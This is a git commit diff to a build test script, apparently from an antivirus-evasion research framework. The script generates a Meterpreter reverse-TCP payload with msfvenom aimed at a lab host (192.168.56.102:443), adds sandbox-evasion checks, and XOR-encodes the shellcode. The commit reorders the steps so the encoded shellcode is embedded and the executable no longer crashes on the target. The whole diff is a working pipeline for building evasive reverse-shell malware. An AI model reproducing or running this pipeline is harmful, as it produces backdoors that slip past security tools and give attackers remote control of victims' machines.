254d765270a09157f8e589ba0bc8c74dc59647a7
Florian Saager <florian.saager@rub.de>
2018-12-05 13:22:14 +0100

    Fixed bug where unencoded shellcode was set as input, leading to executable crash on target.

--- build/build_test.sh
+++ build/build_test.sh
@@ -26,13 +26,8 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.102 lport=443 -e x8
 # add evasion techniques
 add_evasion fopen_sandbox_evasion
 add_evasion gethostbyname_sandbox_evasion
-append_value HOSTVALUE "this.that" source/evasion/evasion.include
+printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include
 #add_evasion hide_console
-
-# set shellcode source
-# convert from raw to C format using the built-in tool
-./tools/data_raw_to_c/data_raw_to_c input/scraw.txt input/sc.txt buf
-set_shellcode_source static_from_file input/sc.txt
 
 # encode shellcode
 # length of generated key is 4 bytes
@@ -40,6 +35,11 @@ encode_shellcode xor input/scraw.txt input/scenc.txt 4 input/keyraw.txt
 # convert generated key from raw to C
 # array name buf is expected by static_from_file retrieval method
 ./tools/data_raw_to_c/data_raw_to_c input/keyraw.txt input/key.txt key
+
+# set shellcode source
+# convert from raw to C format using the built-in tool
+./tools/data_raw_to_c/data_raw_to_c input/scenc.txt input/sc.txt buf
+set_shellcode_source static_from_file input/sc.txt
 
 # set key source
 set_key_source static_from_file input/key.txt
